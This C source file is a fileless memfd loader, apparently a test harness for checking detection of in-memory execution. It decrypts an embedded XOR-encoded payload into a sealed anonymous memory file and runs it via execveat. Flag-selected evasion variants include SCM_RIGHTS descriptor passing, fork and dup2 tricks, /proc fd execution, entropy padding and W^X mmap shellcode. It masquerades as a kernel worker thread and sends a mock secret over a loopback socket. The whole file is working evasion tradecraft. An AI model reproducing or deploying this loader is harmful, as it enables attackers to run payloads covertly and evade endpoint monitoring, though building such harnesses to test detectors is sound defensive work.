#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "build/payload_bytes.h"

extern char **environ;

static ssize_t write_all(int fd, const uint8_t *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t n = write(fd, buf + total, len - total);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        total += (size_t)n;
    }
    return (ssize_t)total;
}

static void fill_high_entropy(uint8_t *buf, size_t len) {
    uint64_t state = 0x9e3779b97f4a7c15ULL;
    for (size_t i = 0; i < len; i++) {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        buf[i] = (uint8_t)(state & 0xff);
    }
}

static int attempt_loopback_exfil(int port, const char *comm, const char *exe_label) {
    if (port <= 0) {
        return 0;
    }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    char msg[256];
    int n = snprintf(
        msg,
        sizeof(msg),
        "EXFIL pid=%d comm=%s exe=%s secret=OS_FALL2026_MEMFD_TOKEN\n",
        getpid(),
        comm,
        exe_label
    );
    ssize_t sent = send(sock, msg, (size_t)n, 0);
    close(sock);
    return (sent > 0) ? (int)sent : -1;
}

static int send_fd_scm(int sock_fd, int fd_to_send) {
    char dummy = 'F';
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    union {
        char buf[CMSG_SPACE(sizeof(int))];
        struct cmsghdr align;
    } ctrl;
    memset(&ctrl, 0, sizeof(ctrl));

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl.buf;
    msg.msg_controllen = sizeof(ctrl.buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd_to_send, sizeof(int));

    return sendmsg(sock_fd, &msg, 0) < 0 ? -1 : 0;
}

static int recv_fd_scm(int sock_fd) {
    char dummy = 0;
    struct iovec iov = { .iov_base = &dummy, .iov_len = 1 };
    union {
        char buf[CMSG_SPACE(sizeof(int))];
        struct cmsghdr align;
    } ctrl;
    memset(&ctrl, 0, sizeof(ctrl));

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = ctrl.buf;
    msg.msg_controllen = sizeof(ctrl.buf);

    if (recvmsg(sock_fd, &msg, 0) <= 0) {
        return -1;
    }

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (!cmsg || cmsg->cmsg_level != SOL_SOCKET || cmsg->cmsg_type != SCM_RIGHTS) {
        return -1;
    }

    int rx_fd = -1;
    memcpy(&rx_fd, CMSG_DATA(cmsg), sizeof(int));
    return rx_fd;
}

static int run_mmap_exec(const char *fake_name, int masquerade, int ticks, int exfil_port) {
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

#if defined(__x86_64__)
    static const uint8_t stub[] = { 0xb8, 0x37, 0x13, 0x00, 0x00, 0xc3 };
#elif defined(__aarch64__)
    static const uint8_t stub[] = { 0xe0, 0x66, 0x82, 0x52, 0xc0, 0x03, 0x5f, 0xd6 };
#else
    static const uint8_t stub[] = { 0xc3 };
#endif
    memcpy(page, stub, sizeof(stub));

    if (mprotect(page, 4096, PROT_READ | PROT_EXEC) < 0) {
        perror("mprotect");
        munmap(page, 4096);
        return 1;
    }

    typedef int (*jit_fn_t)(void);
    jit_fn_t fn = NULL;
    memcpy(&fn, &page, sizeof(fn));
    int magic = fn();

    if (masquerade) {
        prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);
    }

    char comm[32] = {0};
    prctl(PR_GET_NAME, (unsigned long)comm, 0, 0, 0);

    if (exfil_port > 0) {
        int sent = attempt_loopback_exfil(exfil_port, comm, "anon_mmap_w2x");
        if (sent > 0) {
            printf("[mmap-payload] exfiltrated %d bytes to 127.0.0.1:%d (pid=%d)\n",
                   sent, exfil_port, getpid());
            fflush(stdout);
        }
    }

    printf("[mmap-payload] pid=%d ppid=%d comm=%s magic=0x%x (0 B disk I/O)\n",
           getpid(), getppid(), comm, magic);
    fflush(stdout);

    for (int i = 1; i <= ticks; i++) {
        printf("[mmap-payload] heartbeat %d/%d (pid=%d)\n", i, ticks, getpid());
        fflush(stdout);
        usleep(500000);
    }

    munmap(page, 4096);
    printf("[mmap-payload] completed without interception\n");
    return 0;
}

int main(int argc, char *argv[]) {
    const char *memfd_name = "jit_cache";
    const char *fake_argv0 = "[kworker/u8:2]";
    const char *fake_name = "[kworker/u8:2]";
    int benign_only = 0;
    int dup_fd_evasion = 0;
    int fork_evasion = 0;
    int execve_fd_evasion = 0;
    int high_entropy = 0;
    int mmap_exec_evasion = 0;
    int scm_fd_evasion = 0;
    int masquerade = 1;
    int ticks = 8;
    int exfil_port = 0;
    int passthrough_idx = 0;
    char *child_argv[24];

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--benign-memfd") == 0) {
            benign_only = 1;
        } else if (strcmp(argv[i], "--dup-fd") == 0) {
            dup_fd_evasion = 1;
        } else if (strcmp(argv[i], "--fork") == 0) {
            fork_evasion = 1;
        } else if (strcmp(argv[i], "--execve-fd") == 0) {
            execve_fd_evasion = 1;
        } else if (strcmp(argv[i], "--high-entropy") == 0) {
            high_entropy = 1;
        } else if (strcmp(argv[i], "--mmap-exec") == 0) {
            mmap_exec_evasion = 1;
        } else if (strcmp(argv[i], "--scm-fd") == 0) {
            scm_fd_evasion = 1;
        } else if (strcmp(argv[i], "--memfd-name") == 0 && i + 1 < argc) {
            memfd_name = argv[++i];
        } else if (strcmp(argv[i], "--argv0") == 0 && i + 1 < argc) {
            fake_argv0 = argv[++i];
        } else {
            if (strcmp(argv[i], "--no-masquerade") == 0) {
                masquerade = 0;
            } else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) {
                fake_name = argv[i + 1];
            } else if (strcmp(argv[i], "--ticks") == 0 && i + 1 < argc) {
                ticks = atoi(argv[i + 1]);
            } else if (strcmp(argv[i], "--exfil-port") == 0 && i + 1 < argc) {
                exfil_port = atoi(argv[i + 1]);
            }
            if (passthrough_idx < 22) {
                child_argv[++passthrough_idx] = argv[i];
            }
        }
    }

    if (mmap_exec_evasion) {
        return run_mmap_exec(fake_name, masquerade, ticks, exfil_port);
    }

    int sv[2] = { -1, -1 };
    if (scm_fd_evasion) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
            perror("socketpair");
            return 1;
        }
        pid_t rx_pid = fork();
        if (rx_pid < 0) {
            perror("fork(scm)");
            close(sv[0]);
            close(sv[1]);
            return 1;
        }
        if (rx_pid == 0) {
            close(sv[0]);
            int rx_fd = recv_fd_scm(sv[1]);
            close(sv[1]);
            if (rx_fd < 0) {
                fprintf(stderr, "error: failed to receive memfd over SCM_RIGHTS\n");
                _exit(1);
            }
            child_argv[0] = (char *)fake_argv0;
            child_argv[passthrough_idx + 1] = NULL;
            char pid_fd_path[64];
            snprintf(pid_fd_path, sizeof(pid_fd_path), "/proc/%d/fd/%d", getpid(), rx_fd);
            execve(pid_fd_path, child_argv, environ);
            perror("execve(scm_pid_fd)");
            close(rx_fd);
            _exit(1);
        }
        close(sv[1]);
    }

    unsigned int mfd_flags = MFD_ALLOW_SEALING;
    if (!fork_evasion && !execve_fd_evasion && !scm_fd_evasion) {
        mfd_flags |= MFD_CLOEXEC;
    }

    int fd = memfd_create(memfd_name, mfd_flags);
    if (fd < 0) {
        perror("memfd_create");
        if (sv[0] >= 0) close(sv[0]);
        return 1;
    }

    if (benign_only) {
        const char *msg = "shared audio buffer data";
        if (write_all(fd, (const uint8_t *)msg, strlen(msg)) < 0) {
            perror("write");
            close(fd);
            if (sv[0] >= 0) close(sv[0]);
            return 1;
        }
        printf("[loader] benign memfd created (pid=%d fd=%d), exiting without exec\n",
               getpid(), fd);
        close(fd);
        if (sv[0] >= 0) close(sv[0]);
        return 0;
    }

    uint8_t *decrypted = malloc(PAYLOAD_LEN);
    if (!decrypted) {
        perror("malloc");
        close(fd);
        if (sv[0] >= 0) close(sv[0]);
        return 1;
    }

    for (size_t i = 0; i < PAYLOAD_LEN; i++) {
        decrypted[i] = PAYLOAD_ENC[i] ^ PAYLOAD_XOR_KEY;
    }

    if (write_all(fd, decrypted, PAYLOAD_LEN) < 0) {
        perror("write");
        free(decrypted);
        close(fd);
        if (sv[0] >= 0) close(sv[0]);
        return 1;
    }
    free(decrypted);

    size_t total_size = PAYLOAD_LEN;
    if (high_entropy) {
        size_t pad_len = 49152;
        uint8_t *noise = malloc(pad_len);
        if (!noise) {
            perror("malloc");
            close(fd);
            if (sv[0] >= 0) close(sv[0]);
            return 1;
        }
        fill_high_entropy(noise, pad_len);
        if (write_all(fd, noise, pad_len) < 0) {
            perror("write(overlay)");
            free(noise);
            close(fd);
            if (sv[0] >= 0) close(sv[0]);
            return 1;
        }
        free(noise);
        total_size += pad_len;
    }

    int seals = F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL;
    if (fcntl(fd, F_ADD_SEALS, seals) < 0) {
        perror("fcntl(F_ADD_SEALS)");
        close(fd);
        if (sv[0] >= 0) close(sv[0]);
        return 1;
    }

    if (scm_fd_evasion) {
        if (send_fd_scm(sv[0], fd) < 0) {
            perror("sendmsg(SCM_RIGHTS)");
            close(fd);
            close(sv[0]);
            return 1;
        }
        close(fd);
        close(sv[0]);
        _exit(0);
    }

    if (dup_fd_evasion) {
        int target_fd = 42;
        if (dup2(fd, target_fd) < 0) {
            perror("dup2");
            close(fd);
            return 1;
        }
        close(fd);
        fd = target_fd;
    }

    if (fork_evasion) {
        pid_t child = fork();
        if (child < 0) {
            perror("fork");
            close(fd);
            return 1;
        }
        if (child > 0) {
            close(fd);
            _exit(0);
        }
    }

    child_argv[0] = (char *)fake_argv0;
    child_argv[passthrough_idx + 1] = NULL;

    printf("[loader] executing sealed memfd payload (pid=%d fd=%d size=%zu bytes)\n",
           getpid(), fd, total_size);
    fflush(stdout);

    if (execve_fd_evasion) {
        char fd_path[64];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        execve(fd_path, child_argv, environ);
        perror("execve(/proc/self/fd)");
        close(fd);
        return 1;
    }

    if (syscall(SYS_execveat, fd, "", child_argv, environ, AT_EMPTY_PATH) < 0) {
        perror("execveat");
        close(fd);
        return 1;
    }

    return 0;
}
